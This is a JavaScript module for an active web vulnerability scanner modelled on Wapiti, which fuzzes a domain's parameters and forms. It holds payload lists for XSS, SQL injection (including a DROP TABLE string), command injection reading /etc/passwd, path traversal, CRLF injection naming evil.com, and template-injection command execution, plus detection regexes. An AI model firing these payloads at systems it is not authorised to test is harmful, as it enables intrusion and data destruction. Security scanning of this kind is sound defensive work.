/**
 * wapitiscan.js — Wapiti-inspired Active Web Vulnerability Scanner
 *
 * Implements black-box fuzzing of URL parameters and HTML forms to detect:
 *   - Reflected XSS
 *   - SQL Injection (error-based)
 *   - Command Injection
 *   - Path Traversal / Local File Inclusion
 *   - CRLF / Header Injection
 *   - Server-Side Template Injection (SSTI)
 *   - Information Disclosure
 *
 * Philosophy (from Wapiti): crawl the page, extract injectable points
 * (URL params + HTML forms), then replay each with attack payloads,
 * analysing responses for vulnerability indicators.
 */

'use strict';

// ─── Attack Payloads ──────────────────────────────────────────────────────────

const XSS_PAYLOADS = [
  '<script>alert(1)</script>',
  '"><script>alert(1)</script>',
  "'><img src=x onerror=alert(1)>",
  '<svg onload=alert(1)>',
  'javascript:alert(1)',
  '"><svg/onload=alert(1)>',
];

// Strings that indicate successful reflection (un-encoded)
const XSS_INDICATORS = [
  '<script>alert(1)</script>',
  'onerror=alert(1)',
  'onload=alert(1)',
  '<svg onload',
  'javascript:alert(1)',
];

const SQLI_PAYLOADS = [
  "'",
  '"',
  "' OR '1'='1",
  "' OR 1=1--",
  "1' AND SLEEP(0)--",
  "'; DROP TABLE users--",
  "1 UNION SELECT NULL--",
  '\\',
];

// DB error patterns (MySQL, Postgres, SQLite, MSSQL, Oracle)
const SQLI_ERRORS = [
  /you have an error in your sql syntax/i,
  /warning.*mysql/i,
  /unclosed quotation mark/i,
  /quoted string not properly terminated/i,
  /pg_query\(\)/i,
  /pg_exec\(\)/i,
  /sqlite_error/i,
  /odbc sql server driver/i,
  /syntax error.*near/i,
  /microsoft ole db provider for sql server/i,
  /ora-\d{5}/i,
  /db2 sql error/i,
  /invalid sql statement/i,
  /supplied argument is not a valid.*sql/i,
  /sql syntax.*mysql/i,
  /division by zero/i,
  /data type mismatch/i,
];

const CMDI_PAYLOADS = [
  ';id',
  '|id',
  '`id`',
  '$(id)',
  ';whoami',
  '|whoami',
  '&&whoami',
  ';cat /etc/passwd',
  '|cat /etc/passwd',
];

const CMDI_INDICATORS = [
  /uid=\d+\(.*gid=\d+\(/,
  /root:x:0:0:/,
  /daemon:x:1:1:/,
];

const LFI_PAYLOADS = [
  '../../../../etc/passwd',
  '../../../../etc/passwd%00',
  '....//....//....//etc/passwd',
  '%2e%2e%2f%2e%2e%2fetc%2fpasswd',
  '..%2f..%2f..%2f..%2fetc%2fpasswd',
  '../../../../windows/win.ini',
  '../../../../boot.ini',
  '%252e%252e%252fetc%252fpasswd',
];

const LFI_INDICATORS = [
  /root:x:0:0:/,
  /\[boot loader\]/i,
  /\[extensions\]/i,
  /for 16-bit app support/i,
];

const CRLF_PAYLOADS = [
  '%0d%0aX-Wapiti-Injected: test',
  '%0aX-Wapiti-Injected: test',
  '\r\nX-Wapiti-Injected: test',
  '%0d%0aSet-Cookie: wapiti=injected',
  '%0d%0aLocation: https://evil.com',
];

const SSTI_PAYLOADS = [
  '{{70000*70000}}',
  '${70000*70000}',
  '<%= 70000*70000 %>',
  '#{70000*70000}',
  '*{70000*70000}',
  '{{70000*\'7\'}}',
  '${{"freemarker.template.utility.Execute"?new()("id")}}',
];

const SSTI_INDICATORS = [
  /\b4900000000\b/,         // 70000*70000
  /\b7777777\b/,            // 7*'7' in some engines
];

// ─── Information Disclosure Patterns ─────────────────────────────────────────

const INFO_PATTERNS = [
  { pattern: /stack trace/i,                    title: 'Stack Trace Exposed',         sev: 'high' },
  { pattern: /at\s+\w+\.\w+\s*\(.*:\d+:\d+\)/, title: 'JavaScript Stack Trace',      sev: 'high' },
  { pattern: /warning:\s*\w+\(/i,               title: 'PHP Warning Exposed',         sev: 'high' },
  { pattern: /fatal error.*in.*on line \d+/i,   title: 'PHP Fatal Error Exposed',     sev: 'high' },
  { pattern: /parse error.*in.*on line/i,       title: 'PHP Parse Error Exposed',     sev: 'medium' },
  { pattern: /exception in thread/i,            title: 'Java Exception Exposed',      sev: 'high' },
  { pattern: /traceback \(most recent call\)/i, title: 'Python Traceback Exposed',    sev: 'high' },
  { pattern: /sqlexception/i,                   title: 'SQL Exception in Response',   sev: 'high' },
  { pattern: /\b(?:10|172|192)\.(?:\d{1,3}\.){2}\d{1,3}\b/, title: 'Internal IP Address Leaked', sev: 'medium' },
  { pattern: /aws_access_key_id/i,              title: 'AWS Key in Response',         sev: 'critical' },
  { pattern: /secret_key\s*=\s*['"]\w+['"]/i,  title: 'Secret Key in Response',      sev: 'critical' },
  { pattern: /password\s*=\s*['"]\w+['"]/i,    title: 'Hardcoded Password in Response', sev: 'critical' },
  { pattern: /api_key\s*=\s*['"]\w+['"]/i,     title: 'API Key in Response',         sev: 'high' },
  { pattern: /\bDEBUG\s*=\s*True\b/i,          title: 'Debug Mode Enabled',          sev: 'high' },
  { pattern: /x-powered-by:\s*php/i,            title: 'PHP Version Disclosed via Header', sev: 'low' },
  { pattern: /laravel\s+\d+\.\d+/i,            title: 'Laravel Version Disclosed',   sev: 'low' },
];

// ─── URL Parameter Extraction ─────────────────────────────────────────────────

function extractUrlParams(url) {
  try {
    const u = new URL(url);
    const params = [];
    for (const [key] of u.searchParams) {
      params.push({ url, param: key, type: 'query' });
    }
    return params;
  } catch (_) {
    return [];
  }
}

function buildPayloadUrl(url, param, payload) {
  try {
    const u = new URL(url);
    u.searchParams.set(param, payload);
    return u.toString();
  } catch (_) {
    return url;
  }
}

// ─── HTML Link & Form Extraction ─────────────────────────────────────────────

function extractLinks(html, baseUrl) {
  const links = new Set();
  const hrefRe = /href\s*=\s*["']([^"'#?]+(?:\?[^"']*)?)/gi;
  let m;
  while ((m = hrefRe.exec(html)) !== null) {
    try {
      const absolute = new URL(m[1], baseUrl).toString();
      const base = new URL(baseUrl);
      const link = new URL(absolute);
      if (link.hostname === base.hostname && link.searchParams.toString()) {
        links.add(absolute);
      }
    } catch (_) {}
  }
  return [...links];
}

function extractForms(html, baseUrl) {
  const forms = [];
  const formRe = /<form[^>]*>([\s\S]*?)<\/form>/gi;
  let fm;
  while ((fm = formRe.exec(html)) !== null) {
    const formTag = fm[0];
    const body = fm[1];
    const actionMatch = formTag.match(/action\s*=\s*["']([^"']*)/i);
    const methodMatch = formTag.match(/method\s*=\s*["']([^"']*)/i);
    const action = actionMatch ? actionMatch[1] : '';
    const method = (methodMatch ? methodMatch[1] : 'get').toLowerCase();
    let actionUrl = baseUrl;
    try { actionUrl = new URL(action || '/', baseUrl).toString(); } catch (_) {}

    const fields = [];
    const inputRe = /<input[^>]*>/gi;
    let im;
    while ((im = inputRe.exec(body)) !== null) {
      const nameM = im[0].match(/name\s*=\s*["']([^"']*)/i);
      const typeM = im[0].match(/type\s*=\s*["']([^"']*)/i);
      const valM  = im[0].match(/value\s*=\s*["']([^"']*)/i);
      if (nameM && typeM?.[1]?.toLowerCase() !== 'submit' && typeM?.[1]?.toLowerCase() !== 'hidden') {
        fields.push({ name: nameM[1], value: valM?.[1] || 'test' });
      }
    }
    const textareaRe = /<textarea[^>]*name\s*=\s*["']([^"']*)/gi;
    let ta;
    while ((ta = textareaRe.exec(body)) !== null) {
      fields.push({ name: ta[1], value: 'test' });
    }

    if (fields.length > 0) {
      forms.push({ action: actionUrl, method, fields });
    }
  }
  return forms;
}

// ─── Fetch Helpers ────────────────────────────────────────────────────────────

const FETCH_OPTS = {
  redirect: 'follow',
  signal: AbortSignal.timeout(8000),
  headers: {
    'User-Agent': 'Mozilla/5.0 (compatible; WapitiScanner/3.0)',
    Accept: 'text/html,application/xhtml+xml,*/*',
  },
};

async function safeFetch(url, opts = {}) {
  try {
    const r = await fetch(url, { ...FETCH_OPTS, ...opts, signal: AbortSignal.timeout(8000) });
    const text = await r.text();
    return { ok: true, status: r.status, text, headers: Object.fromEntries(r.headers.entries()) };
  } catch (_) {
    return { ok: false, status: 0, text: '', headers: {} };
  }
}

async function safePostFetch(url, body) {
  try {
    const r = await fetch(url, {
      method: 'POST',
      body: new URLSearchParams(body).toString(),
      headers: {
        'Content-Type': 'application/x-www-form-urlencoded',
        'User-Agent': 'Mozilla/5.0 (compatible; WapitiScanner/3.0)',
      },
      redirect: 'follow',
      signal: AbortSignal.timeout(8000),
    });
    const text = await r.text();
    return { ok: true, status: r.status, text };
  } catch (_) {
    return { ok: false, status: 0, text: '' };
  }
}

// ─── Main Module ──────────────────────────────────────────────────────────────

async function runWapitiScan(domain, onProgress) {
  const results = {
    domain,
    attackSurface: { urlParams: 0, forms: 0, testedPoints: 0 },
    attackResults: [],
    findings: [],
    summary: { xss: 0, sqli: 0, cmdi: 0, lfi: 0, crlf: 0, ssti: 0, infoDisc: 0, totalProbes: 0 },
  };

  const baseUrls = [`https://${domain}`, `http://${domain}`];
  let baseUrl = '';
  let homeHtml = '';

  // ── Step 1: Fetch home page ───────────────────────────────────────────────
  onProgress('Fetching target for active vulnerability scanning...');
  for (const url of baseUrls) {
    const r = await safeFetch(url);
    if (r.ok) { baseUrl = url; homeHtml = r.text; break; }
  }
  if (!baseUrl) {
    onProgress('Target unreachable — skipping active scan');
    return results;
  }

  // ── Step 2: Build attack surface ─────────────────────────────────────────
  onProgress('Crawling for injectable parameters and forms...');

  // Home page URL params
  const injectablePoints = [];
  const homeParams = extractUrlParams(baseUrl);
  injectablePoints.push(...homeParams);

  // Linked pages with params (1 level deep)
  const linkedUrls = extractLinks(homeHtml, baseUrl).slice(0, 10);
  for (const lurl of linkedUrls) {
    const params = extractUrlParams(lurl);
    injectablePoints.push(...params);
  }

  // If no URL params found, add a dummy 'id' param to probe (common)
  if (injectablePoints.length === 0) {
    injectablePoints.push({ url: `${baseUrl}/?id=1`, param: 'id', type: 'query' });
    injectablePoints.push({ url: `${baseUrl}/?q=test`, param: 'q', type: 'query' });
    injectablePoints.push({ url: `${baseUrl}/?page=1`, param: 'page', type: 'query' });
    injectablePoints.push({ url: `${baseUrl}/?search=test`, param: 'search', type: 'query' });
  }

  // Forms
  const forms = extractForms(homeHtml, baseUrl);
  results.attackSurface.urlParams = injectablePoints.length;
  results.attackSurface.forms = forms.length;

  // Deduplicate by param name to avoid excessive probing
  const seenParams = new Set();
  const uniquePoints = injectablePoints.filter(p => {
    if (seenParams.has(p.param)) return false;
    seenParams.add(p.param); return true;
  }).slice(0, 8); // cap at 8 unique params

  // ── Step 3: Information Disclosure (passive, on home page) ───────────────
  onProgress('Scanning for information disclosure in page content...');
  for (const pattern of INFO_PATTERNS) {
    if (pattern.pattern.test(homeHtml)) {
      const id = `WAPITI-INFO-${pattern.title.replace(/\s+/g, '-').toUpperCase()}`;
      if (!results.findings.some(f => f.id === id)) {
        results.findings.push({
          id,
          severity: pattern.sev,
          title: pattern.title,
          description: `Detected "${pattern.title}" in the page response. This may expose sensitive internal information.`,
          module: 'wapitiscan',
          affected: baseUrl,
          remediation: 'Disable debug modes, suppress detailed error messages, and avoid exposing internal configuration.',
        });
        results.summary.infoDisc++;
        results.attackResults.push({ category: 'Information Disclosure', status: 'vulnerable', target: baseUrl, detail: pattern.title });
      }
    }
  }

  // ── Step 4: Reflected XSS ────────────────────────────────────────────────
  onProgress('Testing for Reflected XSS vulnerabilities...');
  let xssFound = false;
  for (const point of uniquePoints) {
    if (xssFound) break; // one confirmed finding per type is enough
    for (const payload of XSS_PAYLOADS.slice(0, 3)) {
      results.summary.totalProbes++;
      const testUrl = buildPayloadUrl(point.url, point.param, payload);
      const r = await safeFetch(testUrl);
      if (r.ok) {
        const reflected = XSS_INDICATORS.some(ind => r.text.includes(ind));
        if (reflected) {
          xssFound = true;
          results.summary.xss++;
          results.findings.push({
            id: `WAPITI-XSS-${point.param.toUpperCase()}`,
            severity: 'high',
            title: `Reflected XSS in Parameter "${point.param}"`,
            description: `The "${point.param}" parameter reflects unsanitized input back in the HTML response. Payload: ${payload}`,
            module: 'wapitiscan',
            affected: testUrl,
            remediation: 'HTML-encode all user-supplied data before rendering it in the page. Use a Content Security Policy.',
          });
          results.attackResults.push({ category: 'XSS', status: 'vulnerable', target: testUrl, param: point.param, payload });
          break;
        }
      }
    }
    if (!xssFound) results.attackResults.push({ category: 'XSS', status: 'not detected', target: point.url, param: point.param });
  }

  // Also test forms for XSS
  for (const form of forms.slice(0, 3)) {
    if (xssFound) break;
    for (const field of form.fields.slice(0, 2)) {
      results.summary.totalProbes++;
      const payload = XSS_PAYLOADS[0];
      const body = Object.fromEntries(form.fields.map(f => [f.name, f.value]));
      body[field.name] = payload;
      const r = await (form.method === 'post' ? safePostFetch(form.action, body) : safeFetch(buildPayloadUrl(form.action, field.name, payload)));
      if (r.ok && XSS_INDICATORS.some(ind => r.text.includes(ind))) {
        xssFound = true;
        results.summary.xss++;
        results.findings.push({
          id: `WAPITI-XSS-FORM-${field.name.toUpperCase()}`,
          severity: 'high',
          title: `Reflected XSS in Form Field "${field.name}"`,
          description: `The form field "${field.name}" at ${form.action} reflects unsanitized input. Payload: ${payload}`,
          module: 'wapitiscan',
          affected: form.action,
          remediation: 'HTML-encode all user input before rendering. Implement CSP and use framework-level escaping.',
        });
        break;
      }
    }
  }

  // ── Step 5: SQL Injection ─────────────────────────────────────────────────
  onProgress('Testing for SQL Injection vulnerabilities...');
  let sqliFound = false;
  for (const point of uniquePoints) {
    if (sqliFound) break;
    for (const payload of SQLI_PAYLOADS.slice(0, 4)) {
      results.summary.totalProbes++;
      const testUrl = buildPayloadUrl(point.url, point.param, payload);
      const r = await safeFetch(testUrl);
      if (r.ok && SQLI_ERRORS.some(re => re.test(r.text))) {
        sqliFound = true;
        results.summary.sqli++;
        results.findings.push({
          id: `WAPITI-SQLI-${point.param.toUpperCase()}`,
          severity: 'critical',
          title: `SQL Injection in Parameter "${point.param}"`,
          description: `Database error message detected after injecting "${payload}" into parameter "${point.param}". This indicates error-based SQL injection.`,
          module: 'wapitiscan',
          affected: testUrl,
          remediation: 'Use parameterized queries / prepared statements. Never concatenate user input into SQL strings.',
        });
        results.attackResults.push({ category: 'SQL Injection', status: 'vulnerable', target: testUrl, param: point.param, payload });
        break;
      }
    }
    if (!sqliFound) results.attackResults.push({ category: 'SQL Injection', status: 'not detected', target: point.url, param: point.param });
  }

  // ── Step 6: Command Injection ─────────────────────────────────────────────
  onProgress('Testing for Command Injection vulnerabilities...');
  let cmdiFound = false;
  for (const point of uniquePoints) {
    if (cmdiFound) break;
    for (const payload of CMDI_PAYLOADS.slice(0, 4)) {
      results.summary.totalProbes++;
      const testUrl = buildPayloadUrl(point.url, point.param, `test${payload}`);
      const r = await safeFetch(testUrl);
      if (r.ok && CMDI_INDICATORS.some(re => re.test(r.text))) {
        cmdiFound = true;
        results.summary.cmdi++;
        results.findings.push({
          id: `WAPITI-CMDI-${point.param.toUpperCase()}`,
          severity: 'critical',
          title: `Command Injection in Parameter "${point.param}"`,
          description: `OS command output detected in response after injecting "${payload}" into "${point.param}". Remote code execution is likely possible.`,
          module: 'wapitiscan',
          affected: testUrl,
          remediation: 'Never pass user input to shell commands. Use language-native APIs and strict input validation.',
        });
        results.attackResults.push({ category: 'Command Injection', status: 'vulnerable', target: testUrl, param: point.param, payload });
        break;
      }
    }
    if (!cmdiFound) results.attackResults.push({ category: 'Command Injection', status: 'not detected', target: point.url, param: point.param });
  }

  // ── Step 7: Path Traversal / LFI ─────────────────────────────────────────
  onProgress('Testing for Path Traversal / LFI vulnerabilities...');
  let lfiFound = false;
  for (const point of uniquePoints) {
    if (lfiFound) break;
    for (const payload of LFI_PAYLOADS.slice(0, 4)) {
      results.summary.totalProbes++;
      const testUrl = buildPayloadUrl(point.url, point.param, payload);
      const r = await safeFetch(testUrl);
      if (r.ok && LFI_INDICATORS.some(re => re.test(r.text))) {
        lfiFound = true;
        results.summary.lfi++;
        results.findings.push({
          id: `WAPITI-LFI-${point.param.toUpperCase()}`,
          severity: 'critical',
          title: `Path Traversal / LFI in Parameter "${point.param}"`,
          description: `Sensitive file content (/etc/passwd or similar) detected in response after injecting "${payload}" into "${point.param}".`,
          module: 'wapitiscan',
          affected: testUrl,
          remediation: 'Validate and sanitize file path inputs. Use a whitelist of allowed file names and do not allow directory traversal sequences.',
        });
        results.attackResults.push({ category: 'Path Traversal', status: 'vulnerable', target: testUrl, param: point.param, payload });
        break;
      }
    }
    if (!lfiFound) results.attackResults.push({ category: 'Path Traversal', status: 'not detected', target: point.url, param: point.param });
  }

  // ── Step 8: CRLF / Header Injection ──────────────────────────────────────
  onProgress('Testing for CRLF / Header Injection...');
  let crlfFound = false;
  for (const point of uniquePoints.slice(0, 3)) {
    if (crlfFound) break;
    for (const payload of CRLF_PAYLOADS.slice(0, 2)) {
      results.summary.totalProbes++;
      const testUrl = buildPayloadUrl(point.url, point.param, `value${payload}`);
      const r = await safeFetch(testUrl);
      if (r.ok && (r.headers['x-wapiti-injected'] || r.text.includes('X-Wapiti-Injected'))) {
        crlfFound = true;
        results.summary.crlf++;
        results.findings.push({
          id: `WAPITI-CRLF-${point.param.toUpperCase()}`,
          severity: 'high',
          title: `CRLF / Header Injection in Parameter "${point.param}"`,
          description: `Injected header "X-Wapiti-Injected" appeared in the response, confirming CRLF injection via "${point.param}".`,
          module: 'wapitiscan',
          affected: testUrl,
          remediation: 'Strip or reject CR (\\r) and LF (\\n) characters from all user inputs used in HTTP headers.',
        });
        results.attackResults.push({ category: 'CRLF Injection', status: 'vulnerable', target: testUrl, param: point.param });
        break;
      }
    }
    if (!crlfFound) results.attackResults.push({ category: 'CRLF Injection', status: 'not detected', target: point.url, param: point.param });
  }

  // ── Step 9: SSTI ──────────────────────────────────────────────────────────
  onProgress('Testing for Server-Side Template Injection (SSTI)...');
  let sstiFound = false;
  for (const point of uniquePoints.slice(0, 3)) {
    if (sstiFound) break;
    for (const payload of SSTI_PAYLOADS.slice(0, 3)) {
      results.summary.totalProbes++;
      const testUrl = buildPayloadUrl(point.url, point.param, payload);
      const r = await safeFetch(testUrl);
      if (r.ok && SSTI_INDICATORS.some(re => re.test(r.text))) {
        sstiFound = true;
        results.summary.ssti++;
        results.findings.push({
          id: `WAPITI-SSTI-${point.param.toUpperCase()}`,
          severity: 'critical',
          title: `Server-Side Template Injection in Parameter "${point.param}"`,
          description: `Template expression "${payload}" was evaluated server-side (result: 49 detected), indicating SSTI. This can lead to Remote Code Execution.`,
          module: 'wapitiscan',
          affected: testUrl,
          remediation: 'Never render user input as a template. Use template sandboxes and avoid passing raw user data to template engines.',
        });
        results.attackResults.push({ category: 'SSTI', status: 'vulnerable', target: testUrl, param: point.param, payload });
        break;
      }
    }
    if (!sstiFound) results.attackResults.push({ category: 'SSTI', status: 'not detected', target: point.url, param: point.param });
  }

  // ── Step 10: Security.txt check ───────────────────────────────────────────
  onProgress('Checking for security.txt disclosure policy...');
  const secTxtUrls = [`${baseUrl}/.well-known/security.txt`, `${baseUrl}/security.txt`];
  let secTxtFound = false;
  for (const url of secTxtUrls) {
    results.summary.totalProbes++;
    const r = await safeFetch(url);
    if (r.ok && r.status === 200 && r.text.toLowerCase().includes('contact:')) {
      secTxtFound = true;
      results.attackResults.push({ category: 'Security.txt', status: 'present', target: url, detail: 'Found' });
      break;
    }
  }
  if (!secTxtFound) {
    results.attackResults.push({ category: 'Security.txt', status: 'missing', target: baseUrl, detail: 'Not found' });
    results.findings.push({
      id: 'WAPITI-SECURITY-TXT-MISSING',
      severity: 'info',
      title: 'security.txt Not Found',
      description: 'RFC 9116 recommends publishing a security.txt file to provide vulnerability disclosure contacts.',
      module: 'wapitiscan',
      affected: baseUrl,
      remediation: 'Create /.well-known/security.txt with Contact: and Expires: fields per RFC 9116.',
    });
  }

  // ── Step 11: Mixed Content Detection ─────────────────────────────────────
  if (baseUrl.startsWith('https://')) {
    onProgress('Checking for mixed content (HTTP resources on HTTPS page)...');
    const mixedRe = /(?:src|href|action)\s*=\s*["'](http:\/\/[^"']+)/gi;
    let mm;
    const mixedUrls = [];
    while ((mm = mixedRe.exec(homeHtml)) !== null) {
      mixedUrls.push(mm[1]);
    }
    if (mixedUrls.length > 0) {
      results.findings.push({
        id: 'WAPITI-MIXED-CONTENT',
        severity: 'medium',
        title: 'Mixed Content Detected',
        description: `The HTTPS page loads ${mixedUrls.length} resource(s) over HTTP, which can be intercepted or replaced by attackers. Examples: ${mixedUrls.slice(0, 3).join(', ')}`,
        module: 'wapitiscan',
        affected: baseUrl,
        remediation: 'Ensure all resources (scripts, images, stylesheets) are loaded over HTTPS.',
      });
      results.attackResults.push({ category: 'Mixed Content', status: 'detected', target: baseUrl, detail: `${mixedUrls.length} HTTP resource(s) on HTTPS page` });
    } else {
      results.attackResults.push({ category: 'Mixed Content', status: 'not detected', target: baseUrl });
    }
  }

  // ── Step 12: Subresource Integrity Check ─────────────────────────────────
  onProgress('Checking for missing Subresource Integrity (SRI) on CDN scripts...');
  const cdnScriptRe = /<script[^>]+src\s*=\s*["']https?:\/\/(?!(?:www\.)?[^.]+\.[^.]+\.?$)([^"']+)/gi;
  const externalScripts = [];
  const sriRe = /<script[^>]+integrity\s*=/gi;
  const sriScripts = homeHtml.match(sriRe) || [];
  let esm;
  while ((esm = cdnScriptRe.exec(homeHtml)) !== null) {
    const tag = esm[0];
    if (!tag.includes('integrity=')) externalScripts.push(esm[1]);
  }
  if (externalScripts.length > 0 && sriScripts.length < externalScripts.length) {
    results.findings.push({
      id: 'WAPITI-SRI-MISSING',
      severity: 'medium',
      title: 'Missing Subresource Integrity (SRI) on External Scripts',
      description: `${externalScripts.length} external script(s) lack SRI integrity attributes, making them vulnerable to CDN supply chain attacks.`,
      module: 'wapitiscan',
      affected: baseUrl,
      remediation: 'Add integrity and crossorigin attributes to all external scripts. Use https://www.srihash.org/ to generate hashes.',
    });
    results.attackResults.push({ category: 'Subresource Integrity', status: 'missing', target: baseUrl, detail: `${externalScripts.length} scripts without SRI` });
  } else {
    results.attackResults.push({ category: 'Subresource Integrity', status: 'ok', target: baseUrl });
  }

  results.attackSurface.testedPoints = results.summary.totalProbes;

  const totalFindings = results.findings.length;
  onProgress(`Active web scan complete — ${totalFindings} issue(s) found across ${results.summary.totalProbes} probes`);
  return results;
}

module.exports = { runWapitiScan };
